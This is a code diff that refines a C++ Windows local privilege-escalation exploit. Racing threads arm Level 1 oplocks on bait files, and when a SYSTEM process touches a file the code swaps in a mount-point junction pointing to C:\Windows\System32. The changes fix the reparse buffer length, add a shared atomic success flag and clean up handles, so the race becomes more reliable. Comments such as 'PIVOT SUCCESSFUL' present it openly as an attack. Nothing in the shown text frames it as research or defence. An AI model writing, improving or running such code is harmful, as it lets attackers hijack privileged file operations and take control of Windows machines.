@@ -2,6 +2,7 @@
 #include <winioctl.h>
 #include <vector>
 #include <thread>
+#include <atomic>
 #include <iostream>
 
 // Standard Reparse Buffer Header
@@ -36,7 +37,10 @@ bool ForceJunction(const std::wstring& dir, const std::wstring& target) {
     PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.data());
 
     rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
-    rdb->ReparseDataLength = (USHORT)(targetByteLen + 12);
+    rdb->ReparseDataLength = (USHORT)(
+        FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer)
+        - REPARSE_MOUNTPOINT_HEADER_SIZE
+        + targetByteLen + sizeof(WCHAR));
     rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
     rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);
 
@@ -50,7 +54,7 @@ bool ForceJunction(const std::wstring& dir, const std::wstring& target) {
 }
 
 // The Trap - Arming the Oplock on a High-Priority Thread
-void ArmRace(int id, std::wstring workDir, std::wstring targetPath) {
+void ArmRace(int id, std::wstring workDir, std::wstring targetPath, std::atomic<bool>& succeeded) {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 
     std::wstring bait = workDir + L"\\target_" + std::to_wstring(id) + L".tmp";
@@ -62,6 +66,10 @@ void ArmRace(int id, std::wstring workDir, std::wstring targetPath) {
 
     OVERLAPPED ov = { 0 };
     ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    if (!ov.hEvent) {
+        CloseHandle(hBait);
+        return;
+    }
 
     // Request Level 1 Oplock (The exclusive lock that causes the "Hang")
     DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);
@@ -71,12 +79,16 @@ void ArmRace(int id, std::wstring workDir, std::wstring targetPath) {
         // SYSTEM has touched the file. The kernel has paused the Giant.
         // We have MICROSECONDS to act.
         CloseHandle(hBait);
+        CloseHandle(ov.hEvent);
         DeleteFileW(bait.c_str());
 
-        if (ForceJunction(workDir, targetPath)) {
+        if (!succeeded.load() && ForceJunction(workDir, targetPath)) {
+            succeeded.store(true);
             std::wcout << L"[!] VORTEX THREAD " << id << L": PIVOT SUCCESSFUL." << std::endl;
-            exit(0); // The world is saved.
         }
+    } else {
+        CloseHandle(hBait);
+        CloseHandle(ov.hEvent);
     }
 }
 
@@ -85,9 +97,10 @@ int main() {
     std::wstring target = L"C:\\Windows\\System32";
     CreateDirectoryW(workDir.c_str(), NULL);
 
+    std::atomic<bool> succeeded{false};
     std::vector<std::thread> swarm;
     for (int i = 0; i < 15; i++) {
-        swarm.emplace_back(ArmRace, i, workDir, target);
+        swarm.emplace_back(ArmRace, i, workDir, target, std::ref(succeeded));
     }
 
     for (auto& t : swarm) t.join();
